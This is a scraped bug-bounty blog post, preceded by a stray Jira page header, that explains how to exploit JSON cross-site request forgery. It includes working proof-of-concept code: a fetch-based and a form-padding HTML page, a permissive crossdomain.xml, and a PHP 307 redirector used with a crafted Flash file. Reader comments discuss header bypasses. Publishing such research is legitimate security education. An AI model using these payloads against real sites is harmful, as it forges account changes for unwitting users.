=== Content from www.jfrog.com_613d4c2f_20250124_161322.html ===


[![Custom Jira logo](/s/g2slup/b/9/465fd615889966fcc5edbc0b48569d2d/_/jira-logo-scaled.png)![Custom Jira icon](/s/g2slup/b/9/465fd615889966fcc5edbc0b48569d2d/_/jira-logo-scaled.png)](/jira)ProjectsFiltersDashboardsAppsCreateSearch[Sign in](/login.jsp)![](https://jfrog.atlassian.net/rest/api/2/universal_avatar/view/type/project/avatar/10410?size=xxlarge)
## Artifactory Binary Repository

Software projectMenu[Reports](/projects/RTFACT?selectedItem=com.atlassian.jira.jira-projects-plugin:report-page)[Issues](/jira/software/c/projects/RTFACT/issues)[Archived issuesNew](/jira/software/c/projects/RTFACT/issues/archive)You're in a company-managed project![Loading...](data:image/svg+xml;base64...)



=== Content from www.geekboy.ninja_2d8d589d_20250126_020612.html ===

[![](https://www.geekboy.ninja/blog/wp-content/uploads/2016/09/cropped-header.jpg)](https://www.geekboy.ninja/blog/)
[![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea/?s=140&d=mm)](https://www.geekboy.ninja/blog/)
# [Geekboy | Security Researcher](https://www.geekboy.ninja/blog/)

## Bug Bounty Hunter

# Menu

# Widgets

# Search

[Skip to content](#content)

* [Home](http://www.geekboy.ninja/blog)
* [About Me](https://www.geekboy.ninja/blog/about/)
* [Contact Me](https://www.geekboy.ninja/blog/contact/)

# Recent Posts

* [Exploiting unusual Referer based XSS](https://www.geekboy.ninja/blog/exploiting-unusual-referer-based-xss/)
* [Cross Site Scripting for Fun: PasteJacking](https://www.geekboy.ninja/blog/cross-site-scripting-for-fun-pastejacking/)
* [Exploiting JSON Cross Site Request Forgery (CSRF) using Flash](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/)
* [Exploiting Misconfigured CORS via Wildcard Subdomains](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-via-wildcard-subdomains/)
* [Turning Simple Login CSRF to Account Takeover](https://www.geekboy.ninja/blog/turning-simple-login-csrf-to-account-takeover/)
# Follow Me

# Contact Me

* emgeekboy@gmail.com

Search for:

# Exploiting JSON Cross Site Request Forgery (CSRF) using Flash

[August 26, 2017](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/ "8:03 pm")[Geekboy](https://www.geekboy.ninja/blog/author/admin/ "View all posts by Geekboy")

### Update 2:

For the Case 1, there is possibility in some cases where server reject the request due to extra padding of data, but there is another and best way, using **fetch** or XHR request we can submit the json formatted data without any limitations, added poc code for the same.

Thanks to [Prakash](https://twitter.com/1lastBr3ath) for making me aware of this.

###

### Update 1:

Great work by [Evgeniy](https://twitter.com/h1_sp1d3r) who edited and compiled the Flash file in a way where users can pass all the information including JSON data, php file & target endpoint via URL parameter, which not only make all those complex procedures simpler but also remove the hectic task to recompilation of flash file each time for the Case 2.

[Here](https://github.com/sp1d3r/swf_json_csrf/) is the the updated flash and other files by [Evgeniy](https://twitter.com/h1_sp1d3r).

---

Hello Friends!

Everyone knows about basic csrf attack, if not just go through this [owasp page](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29) and *burp engagement tools* have easiest option to create csrf proof of concept for all kind of basic csrf attack including performing csrf via xhr request.

in this post i’m going to talk about csrf scenarios which i encountered many times and seen many researchers from community are curious about it, so i will try clear as much possible!

so this trick comes into play when post request data formatted into json format, eg: {“name”:”test”, “email”:”victim.com”}, which have 2 scenario.

#### Case 1:

* Server looking for json formatted data but don’t validate the Content-type

#### Case 2:

* Server looking for json formatted data and validate the Content-type as well, i.e application/json

*Note: This csrf attack only works when the application do only rely either on json formatted data or Content-type application/json, and data format check, if there is any additional csrf token/referer check at place this will not work.*

---

### Exploiting Case 1:

~~This can be achieved with little HTML trick using name attribute with padding some extra data~~, simply can be done using **Fetch** request, as we know in this case server is only checking for the post data if it’s correctly formatted or not, if yes it will accept the request regardless the **Content-type** is set as **text/plain**

Now assume we have to submit this test data to the vulnerable application: {“name”:”attacker”,”email”:”attacker@gmail.com”}

**Updated method:**

```
<html>
<title>JSON CSRF POC</title>
<body>
<center>
<h1> JSON CSRF POC </h1>
<script>
fetch('http://vul-app.com', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"name":"attacker","email":"attacker.com"}'});
</script>
<form action="#">
<input type="button" value="Submit" />
</form>
</center>
</body>
</html>

```

[![](http://www.geekboy.ninja/blog/wp-content/uploads/2017/08/featchjson.png)](http://www.geekboy.ninja/blog/wp-content/uploads/2017/08/featchjson.png)

*Source: <http://research.rootme.in/forging-content-type-header-with-flash>*

**Old Method:**

```
<html>
<title>JSON CSRF POC</title>
<center>
<h1> JSON CSRF POC </h1>
<form action=http://vul-app.com method=post enctype="text/plain" >
<input name='{"name":"attacker","email":"attacker@gmail.com","ignore_me":"' value='test"}'type='hidden'>
<input type=submit value="Submit">
</form>
</center>
</html>

```

This will make post request with valid json formatted data with padding some extra data, if the application don’t care about extra data which happened in most of cases i seen. if not, there is always 2nd way to use.

[![](http://www.geekboy.ninja/blog/wp-content/uploads/2017/08/jsonpadding.png)](http://www.geekboy.ninja/blog/wp-content/uploads/2017/08/jsonpadding.png)

*Source: <http://blog.opensecurityresearch.com/2012/02/json-csrf-with-parameter-padding.html>*

---

### Exploiting Case 2:

Here even if application is validating the **Content-type** and **data format**, this attack can be achieved using **flash and 307 redirect**.

**Requirements:**

1. **Crafted Flash file**
2. **Crossdomain XML file**
3. **PHP file with 307 status code**

#### Crafted Flash file:

This flash (.swf) file have our json formatted data which attacker have to post on the target application, and link to hosted php file in it.

[![](http://www.geekboy.ninja/blog/wp-content/uploads/2017/08/flash.png)](http://www.geekboy.ninja/blog/wp-content/uploads/2017/08/flash.png)

Here is the test [SWF file](http://geekboy.ninja/files/test.swf), you can download and edit the contents as per your need, i do use [FFDec](https://www.free-decompiler.com/flash/download/) on Windows for editing and compiling the flash file, you can check others based on your environment.

#### Crossdomain XML file:

```
<cross-domain-policy>
<allow-access-from domain="*" secure="false"/>
<allow-http-request-headers-from domain="*" headers="*" secure="false"/>
</cross-domain-policy>
```

This file should be hosted on attackers website’s root directory, so flash file can make request to attacker’s host.

*Note: You don’t need crossdomain file if  flash file & redirector page is on same domain.*
#### PHP file with 307 status code:

```
<?php

// redirect automatically

header("Location: https://victim.com/user/endpoint/", true, 307);

?>
```

Flash file request for this php file, this will make 307 redirect to mentioned application endpoint, and as 307 is special redirect which will post the JSON data as well which got received from the flash file to the target endpoint and CSRF will take place successfully.

[![](http://www.geekboy.ninja/blog/wp-content/uploads/2017/08/jsonflash.png)](http://www.geekboy.ninja/blog/wp-content/uploads/2017/08/jsonflash.png)

Here is the public report [#44146](https://hackerone.com/reports/44146) by [@avlidienbrunn](https://twitter.com/avlidienbrunn) for the same.

---

*Note: As this is based on flash, so flash should be installed in browser to make it work, which is very normal for now but may not be in future.*

do let me know if you have any queries in comment section or tweet about it [here](https://twitter.com/emgeekboy) , and thanks to [Parth](https://twitter.com/Parth_Malhotra) for the proof reading.

[Share on Facebook](http://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.geekboy.ninja%2Fblog%2Fexploiting-json-cross-site-request-forgery-csrf-using-flash%2F)[Share on Twitter](http://twitter.com/intent/tweet/?text=Exploiting+JSON+Cross+Site+Request+Forgery+%28CSRF%29+using+Flash&url=https%3A%2F%2Fwww.geekboy.ninja%2Fblog%2Fexploiting-json-cross-site-request-forgery-csrf-using-flash%2F)

[CSRF](https://www.geekboy.ninja/blog/tag/csrf/)[CSRF Exploitation](https://www.geekboy.ninja/blog/tag/csrf-exploitation/)[Flash CSRF](https://www.geekboy.ninja/blog/tag/flash-csrf/)[JSON CSRF](https://www.geekboy.ninja/blog/tag/json-csrf/)

# Post navigation

[←](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-via-wildcard-subdomains/)[→](https://www.geekboy.ninja/blog/cross-site-scripting-for-fun-pastejacking/)

## 73 thoughts on “Exploiting JSON Cross Site Request Forgery (CSRF) using Flash”

1. ![](https://secure.gravatar.com/avatar/6fdeec8d8b2f35389ca4655386084e87?s=70&d=mm&r=g) [mani](http://www.nic.in) says:

   great illustrations

   [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1088#respond) [August 27, 2017 at 8:37 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1088)
3. Pingback: [Tutoriels & Guides | Pearltrees](http://www.pearltrees.com/bugrecovery/tutoriels-guides/id18085889/item207352001)
5. ![](https://secure.gravatar.com/avatar/7526d3b510eda76054a393b522974427?s=70&d=mm&r=g) b1t says:

   Greate post ! Does the 307 redirect trick works with all version of browers/flash or just some specific one ?

   [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1092#respond) [August 28, 2017 at 8:45 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1092)

   * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) admin says:

     Yes! most of them, in case if you noticed it’s not working for you, make sure you have Flash installed in browser.

     [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1094#respond) [August 28, 2017 at 9:46 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1094)

     + ![](https://secure.gravatar.com/avatar/3f1f651c5d6922ccc26ee673972e954f?s=70&d=mm&r=g) Pratik says:

       is it possible to exploit in GET method?

       [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1471#respond) [December 20, 2017 at 6:30 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1471)

       - ![](https://secure.gravatar.com/avatar/3f1f651c5d6922ccc26ee673972e954f?s=70&d=mm&r=g) Pratik says:

         Sorry in PUT method?

         [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1472#respond) [December 20, 2017 at 6:31 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1472)

         * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

           Not possible.

           [January 2, 2018 at 9:04 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1495)
         * ![](https://secure.gravatar.com/avatar/0fdbac431ea207a7fc614c8ee1fc6d22?s=70&d=mm&r=g) raghav says:

           Hi,

           If you craft an XHR Request and use Internet Explorer, this can be achieved using the PUT method.

           [September 4, 2018 at 9:18 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-3124)
         * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

           No, only GET/POST can be used for this.

           [September 26, 2019 at 4:57 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-5196)
7. ![](https://secure.gravatar.com/avatar/6259995695c0b253bda3db3c1942ba4e?s=70&d=mm&r=g) Andrew says:

   Interesting, do this trick with SWF possible also with PUT method, or it’s POST only?

   [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1095#respond) [August 28, 2017 at 8:02 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1095)

   * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) admin says:

     No, PUT or DELETE will not work.

     [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1096#respond) [August 28, 2017 at 8:08 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1096)

     + ![](https://secure.gravatar.com/avatar/08ba4589d90bdd854dee0b61bab057f0?s=70&d=mm&r=g) Sinx says:

       can this method be done in PATCH? the app is using a PATCH method to submit the json form.

       Thanks

       [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=3429#respond) [November 15, 2018 at 10:02 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-3429)

       - ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

         No! only GET and POST

         [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=4274#respond) [May 23, 2019 at 3:47 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-4274)
       - ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

         No, only GET/POST

         [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=5198#respond) [September 26, 2019 at 5:01 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-5198)
9. Pingback: [【知识】8月28日 - 每日安全知识热点 - 莹莹之色](http://hack.hk.cn/2017/08/29/%E3%80%90%E7%9F%A5%E8%AF%86%E3%80%918%E6%9C%8828%E6%97%A5-%E6%AF%8F%E6%97%A5%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E7%83%AD%E7%82%B9/)
11. Pingback: [【知识】8月28日 – 每日安全知识热点 – 安百科技](https://vul.anbai.com/43978.html)
13. Pingback: [半月安全看看看2017八月下 – 安全0day](http://www.netsec0day.com/?p=434)
15. ![](https://secure.gravatar.com/avatar/a25a4558ce44f4f86c42fbab6d059235?s=70&d=mm&r=g) Amit Dubey says:

    Nice…i was waiting for this :p

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1110#respond) [September 3, 2017 at 5:10 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1110)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) admin says:

      🙂

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1111#respond) [September 3, 2017 at 9:01 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1111)
17. ![](https://secure.gravatar.com/avatar/7f42d7ac2f7f29a237c00db980ec5267?s=70&d=mm&r=g) sp1d3r says:

    Can the flash file read the response from the target?

    I tried some JSON Hijacking from the GET endpoints using event listeners with urlLoader (Event.COMPLETE) – but in this case problems with response reading was raised – and event was never reached. Looks like in this case SOP works as it should=) Got it working only with insecure crossdomain.xml on the target host.

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1114#respond) [September 3, 2017 at 11:29 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1114)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) admin says:

      You can only read the response from target host if there is misconfigured crossdomain file which allow any (\*) domain or subdomain where you can control the flash file to make request, and for exploiting that there is [framework](https://github.com/sethsec/crossdomain-exploitation-framework).

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1115#respond) [September 3, 2017 at 11:40 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1115)

      + ![](https://secure.gravatar.com/avatar/7f42d7ac2f7f29a237c00db980ec5267?s=70&d=mm&r=g) sp1d3r says:

        Thanks a lot for the info!

        [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1116#respond) [September 4, 2017 at 12:06 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1116)
19. Pingback: [Web-Security-Learning 学习资料 – 雨苁](http://www.ddosi.com/2017/09/19/study/)
21. ![](https://secure.gravatar.com/avatar/30a2cbba690e6f5f157aee9d8daa674f?s=70&d=mm&r=g) [JoyChou](https://joychou.org) says:

    fetch follows cors

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1156#respond) [September 21, 2017 at 3:10 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1156)
23. ![](https://secure.gravatar.com/avatar/30a2cbba690e6f5f157aee9d8daa674f?s=70&d=mm&r=g) [JoyChou](https://joychou.org) says:

    Fetch follows cors. So, fetch can exploit csrf ?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1157#respond) [September 21, 2017 at 3:17 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1157)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      in that case you can try html name attribute trick.

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1197#respond) [September 25, 2017 at 10:12 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1197)
25. Pingback: [Web-Security-Learning - iceH‘s Blog](http://www.secice.cn/107)
27. Pingback: [Web-Security-Learning – 🔰雨苁ℒ🔰](http://www.ddosi.com/2017/09/05/web-security-learning/)
29. Pingback: [Exploiting JSON CSRF - SecPulse.COM | 安全脉搏](https://www.secpulse.com/archives/61297.html)
31. ![](https://secure.gravatar.com/avatar/47324fe2b17c001456b033627602b89b?s=70&d=mm&r=g) [ak1t4](http://twitter.com/knowledge_2014) says:

    Awesome article,

    Receive a 307 redirect request as GET/POST bypass the content/type filter, this is an issue built-in from the browsers right?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1208#respond) [September 29, 2017 at 7:42 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1208)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      Thanks, this is intended behavior for the Flash.

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1215#respond) [October 2, 2017 at 7:31 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1215)
33. ![](https://secure.gravatar.com/avatar/ae2da5855dddc90c8520322015be3013?s=70&d=mm&r=g) utkarsh says:

    What if there is X-Requested-with header is?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1212#respond) [October 1, 2017 at 5:50 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1212)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      That’s blocked by Flash, so can’t be done!

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1214#respond) [October 2, 2017 at 7:29 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1214)
35. Pingback: [Exploiting JSON CSRF – 安百科技](https://vul.anbai.com/49399.html)
37. ![](https://secure.gravatar.com/avatar/47324fe2b17c001456b033627602b89b?s=70&d=mm&r=g) [ak1t4](http://twitter.com/knowledge_2014) says:

    For the flash + redirect bypass, The attacker’s host needs to have a permissive crossdomain.xml file too?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1322#respond) [October 30, 2017 at 1:24 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1322)

    * ![](https://secure.gravatar.com/avatar/47324fe2b17c001456b033627602b89b?s=70&d=mm&r=g) [ak1t4](http://twitter.com/knowledge_2014) says:

      is “victim host”, not attacker’s host. sorry 🙂

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1324#respond) [October 30, 2017 at 1:25 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1324)

      + ![](https://secure.gravatar.com/avatar/47324fe2b17c001456b033627602b89b?s=70&d=mm&r=g) [ak1t4](http://twitter.com/knowledge_2014) says:

        Now i got it!

        Why it works

        To clarify, the SOP/CORS are failing in the case of 307 redirect trick (due to that fact, that during 307 redirect crossdomain.xml on the target host will be called after the POST request for some reason – so POST request wiill reach the destination), and can only prevent the response reading by the Flash application, but not prevent the CSRF attack itself (it can be the Flash fault, or the way how the browsers are handling 307 redirects of the requests, initialized by Flash applications).

        <https://hackerone.com/reports/263662>

        THANKS!

        [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1325#respond) [October 30, 2017 at 1:30 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1325)
      + ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

        No, if the **php redirector** file hosted on the same host, otherwise Yes.

        [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1326#respond) [October 30, 2017 at 1:30 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1326)
39. ![](https://secure.gravatar.com/avatar/47324fe2b17c001456b033627602b89b?s=70&d=mm&r=g) [ak1t4](http://twitter.com/knowledge_2014) says:

    For the flash + redirect bypass, The victim host needs to have a permissive crossdomain.xml file too?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1323#respond) [October 30, 2017 at 1:24 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1323)
41. ![](https://secure.gravatar.com/avatar/b8911e91f7fb17c27f9d4feea1e0f215?s=70&d=mm&r=g) Baba Fakruddin says:

    Awesome.. Thanks for sharing

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1363#respond) [November 17, 2017 at 12:11 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1363)
43. ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

    Hey!

    No that’s not possible, adding custom header is not possible anymore with flash trick.

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1398#respond) [November 24, 2017 at 12:05 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1398)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      Glad to know 🙂

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1402#respond) [November 25, 2017 at 2:50 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1402)
45. Pingback: [Web-Security-Learning-安全学堂大集合 | 07v8安全社区](http://www.07v8.com/article/52.html)
47. ![](https://secure.gravatar.com/avatar/bcf062dfec79936c021422d98662d5fd?s=70&d=mm&r=g) kaleem says:

    Hi Geekboy,

    I have tried the above method using Evgeniy project. My testing site does not have any CSRF protection it only rely on content type:json

    However when I try to update my profile it also has a header “Authorization Bearer token” . In POC After my first request I got 307 redirect and in the second request it calls update profile endpoint with my post data. But I don’t see “Authorization Bearer token” added in the second call automatically by the browser.

    I would like to know it does not work if it has a header or I am missing something. Please advice.

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1536#respond) [January 25, 2018 at 12:53 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1536)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      Hey, not possible with the mentioned header.

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1553#respond) [January 31, 2018 at 8:44 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1553)
49. ![](https://secure.gravatar.com/avatar/a7707ee2ae1933f6a24e2d852d6e6591?s=70&d=mm&r=g) Bfbbfnn says:

    X-Requested-with header any bypass for it ?

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1555#respond) [February 1, 2018 at 12:51 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1555)
51. ![](https://secure.gravatar.com/avatar/bcc8080fda378057a10c1ccc8d248ac6?s=70&d=mm&r=g) Aryan says:

    hello, i managed to add the http request headers, but the vulnerable site has no crossdomain.xml and so the request fails, I guess. On redirecting with 307, it request for testingsite.com/crossdomain.xml, which is not available, and so the csrf didnt take place? plz let me know whats wrong here!

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1574#respond) [February 5, 2018 at 8:57 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1574)
53. ![](https://secure.gravatar.com/avatar/d73f760cae722ff01a2601c419d4553b?s=70&d=mm&r=g) Pratik says:

    Hey,

    Great it worked for me . But can you please make a video for case 2 . It will be helpful for every one ..

    Thanks

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1578#respond) [February 6, 2018 at 7:07 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1578)
55. ![](https://secure.gravatar.com/avatar/5f3969ac7c85dbaf1e96417a8b26deb0?s=70&d=mm&r=g) Sahil says:

    Hello,

    I’ve been trying to test the same JSON based CSRF but as shown in the Exploitation case 2 application is validating the Content-type and data format. So, in my case the application is also validating the “origin” http header too along with content-type and therefore I need to add proper origin in the HTTP Request.

    I tried adding `request.requestHeaders.push(new URLRequestHeader(“origin”,”https://www.victimsite.com”));` on the next line after the `request.requestHeaders.push(new URLRequestHeader(“Content-Type”,”application/json”));`

    But this didn’t worked, is there anything I can do to add another HTTP Header?

    Thanks

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1691#respond) [February 18, 2018 at 1:55 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1691)
57. Pingback: [CSRF（跨站点请求伪造）在Flash中的利用 - FreeBuf互联网安全新媒体平台 | 关注黑客与极客](http://www.freebuf.com/articles/web/155189.html)
59. Pingback: [CSRF（跨站点请求伪造）在Flash中的利用 – 安百科技](https://vul.anbai.com/90312.html)
61. ![](https://secure.gravatar.com/avatar/199906c4249842940643de657c3aefb6?s=70&d=mm&r=g) IAmNoOne says:

    Hello geekboy,

    First I would like to thank you for such a nice write-up. I got stuck at one point and need to understand it in more deep.

    “This flash (.swf) file have our json formatted data which attacker have to post on the target application, and link to hosted php file in it.”

    Can you please elaborate it. I downlaoded FFDec and opened test.swf file as well but I am not finding out how to move ahead.

    Kindly guide and try if you can create and post video on this issue as most of the researchers are waiting for it from long time.

    Thanks

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1911#respond) [April 11, 2018 at 3:55 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1911)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      Check update section for the GitHub project, you don’t need to edit the file anymore, just host it and use it.

      [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=1912#respond) [April 11, 2018 at 4:48 pm](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-1912)
63. ![](https://secure.gravatar.com/avatar/c2e3856da59f10227bc2bd653a683947?s=70&d=mm&r=g) Undome says:

    This is great stuff ! Thanks. However when I did same exact steps my swf file is getting downloaded rather than redirecting me to my target, I tried it on chrome, FF, IE, Canary but same result. Not sure if I’m missing anything, any guidance provided will be very helpful.

    [Reply](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/?replytocom=2036#respond) [May 13, 2018 at 4:59 am](https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/#comment-2036)

    * ![](https://secure.gravatar.com/avatar/402c9a4bc3b51bf282ca4cc2618939ea?s=70&d=mm&r=g) Geekboy says:

      Instead of calling SWF file directly in the browser, load it using HTML file.

